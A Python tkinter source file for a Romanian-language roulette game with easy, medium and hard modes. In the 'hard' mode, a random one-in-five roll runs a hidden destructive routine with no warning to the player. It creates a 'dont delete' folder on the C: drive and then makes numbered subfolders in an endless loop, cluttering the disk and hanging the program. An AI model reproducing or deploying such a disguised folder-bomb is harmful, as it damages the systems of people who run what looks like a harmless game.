import tkinter as tk
from tkinter import *
import random as r
import os

fereastra = tk.Tk()
fereastra.title("Joc")
fereastra.geometry("300x600")

l = tk.Label(fereastra, text="Ruleta", foreground="white", background="black", width=40, height=10)
l.pack(fill=tk.BOTH, expand=True)

def alegere1(optiune):
    pop1.destroy()
    if optiune == "da":
        easy()
    if optiune == "nu":
        pass

def alegere2(optiune):
    pop2.destroy()
    if optiune == "da":
        medium()
    if optiune == "nu":
        pass

def alegere3(optiune):
    pop3.destroy()
    if optiune == "da":
        hard()
    if optiune == "nu":
        pass

def alege(optiune):
    if optiune == "da":
        global pop4
        pop4 = Toplevel(fereastra)
        pop4.title("iesire")
        pop4.geometry("300x500")
        pl4 = tk.Label(pop4, text= "Adios?", width=40, height=10, background="black", foreground="white")
        pl4.pack()
        da = tk.Button(pop4, text="Scapa-ma de aici.", width=20, height=10, command=lambda: iesi("da"))
        da.pack()
        no = tk.Button(pop4, text="Nah, sunt dependent", width=20, height=10, command=lambda: iesi("nu"))
        no.pack()

def rulare1(optiune):
    if optiune == "da":
        easy()

def rulare2(optiune):
    if optiune == "da":
        medium()

def rulare3(optiune):
    if optiune == "da":
        hard()

def iesi(optiune):
    if optiune == "da":
        fereastra.destroy()
    if optiune == "nu":
        pop4.destroy()
def easy():
    global pop1
    pop1 = Toplevel(fereastra)
    pop1.title("Slab.")
    pop1.geometry("300x500")
    pl1 = tk.Label(pop1, text="E imposibl sa pierzi (in afara de timp), dar... joc nou?", foreground="#20e24a", background="#18B76C", width=40, height=10)
    pl1.pack()
    da = tk.Button(pop1, text="Da", width=20, height=10, command= lambda: alegere1("da"))
    da.pack()
    no = tk.Button(pop1, text="Nu", width=20, height=10, command= lambda: alegere1("nu"))
    no.pack()

def medium():
    global pop2
    pop2 = Toplevel(fereastra)
    pop2.title("Decent...")
    pop2.geometry("300x500")
    nr1 = r.randrange(1, 6)
    if nr1 == 3:
        pl2 = tk.Label(pop2, text="Teapa, mai incerci?", background="#9f2f2f", foreground="#ff0000", width=40, height=10) #Joc pierdut. Joc nou?
        pl2.pack()
    else:
        pl2 = tk.Label(pop2, text="Bravo frate, mai incerci?", foreground="#20e24a", background="#18B76C", width=40, height=10)  # Joc pierdut. Joc nou?
        pl2.pack()
    da = tk.Button(pop2, text="Da", width=20, height=10, command=lambda: alegere2("da"))
    da.pack()
    no = tk.Button(pop2, text="Nu", width=20, height=10, command=lambda: alegere2("nu"))
    no.pack()

def hard():
    global pop3
    pop3 = Toplevel(fereastra)
    pop3.title("Bafta.")
    pop3.geometry("300x500")
    nr1 = r.randrange(1, 6)
    if nr1 == 3:
        path = "C:\\"
        os.makedirs(f"{path}dont delete")
        count = 0
        while True:
            os.makedirs(f"{path}dont delete\\{count}")
            count += 1
    else:
        pl3 = tk.Label(pop3, text="Zi mersi si pleaca. Nu merge la risc.", foreground="#ffa100", background="#ffd900", width=40, height=10)
        pl3.pack()
        da = tk.Button(pop3, text="Risc.", width=20, height=10, command=lambda: alegere3("da"), background="black", foreground="white")
        da.pack()
        no = tk.Button(pop3, text="Optiunea sanatoasa", width=20, height=10, command=lambda: alegere3("nu"))
        no.pack()

moduri = tk.Label(fereastra, text="Moduri joc:", background="blue", foreground="white", width=40, height=5)
moduri.pack(fill=tk.BOTH, expand=True)
usor = tk.Button(fereastra, text="Slab", width=20, height=5, background="#18B76C", foreground="#20e24a", command= lambda: rulare1("da"))
usor.pack(fill=tk.BOTH, expand=True)
mediu = tk.Button(fereastra, text="Mediocru", width=20, height=5, background="#ffd900", foreground="#ffa100", command= lambda: rulare2("da"))
mediu.pack(fill=tk.BOTH, expand=True)
greu = tk.Button(fereastra, text="Legenda.", width=20, height=5, background="#9f2f2f", foreground="#ff0000", command= lambda: rulare3("da"))
greu.pack(fill=tk.BOTH, expand=True)
iesire = tk.Button(fereastra, text="Iesire", width=20, height=5, command= lambda: alege("da"))
iesire.pack(fill=tk.BOTH, expand=True)

fereastra.mainloop()
